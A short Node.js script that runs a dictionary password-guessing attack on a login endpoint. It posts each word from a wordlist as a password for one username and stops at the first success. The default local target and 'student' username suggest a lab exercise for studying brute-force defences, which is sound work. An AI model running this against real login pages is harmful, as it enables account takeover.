import { readFile } from 'fs/promises';

const TARGET = process.env.TARGET_URL || 'http://localhost:3000/login';
const USERNAME = process.env.USERNAME || 'student';

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

async function main() {
  const dictText = await readFile('dictionary.txt', 'utf8');
  const words = dictText
    .split(/\r?\n/)
    .map((s) => s.trim())
    .filter(Boolean);

  const startedAt = Date.now();

  for (let i = 0; i < words.length; i++) {
    const password = words[i];

    const body = new URLSearchParams();
    body.set('username', USERNAME);
    body.set('password', password);

    const t0 = Date.now();
    const resp = await fetch(TARGET, {
      method: 'POST',
      headers: { 'content-type': 'application/x-www-form-urlencoded' },
      body: body.toString(),
    });

    const text = await resp.text();
    const dt = Date.now() - t0;

    let ok = false;
    try {
      const data = JSON.parse(text);
      ok = Boolean(data.ok);
    } catch {
      ok = resp.status === 200;
    }

    console.log(`${i + 1}/${words.length} password="${password}" status=${resp.status} timeMs=${dt}`);

    if (ok) {
      const total = Date.now() - startedAt;
      console.log(`FOUND password="${password}" totalMs=${total}`);
      return;
    }

    await sleep(100);
  }

  const total = Date.now() - startedAt;
  console.log(`NOT FOUND totalMs=${total}`);
}

main().catch((e) => {
  console.error(e);
  process.exitCode = 1;
});
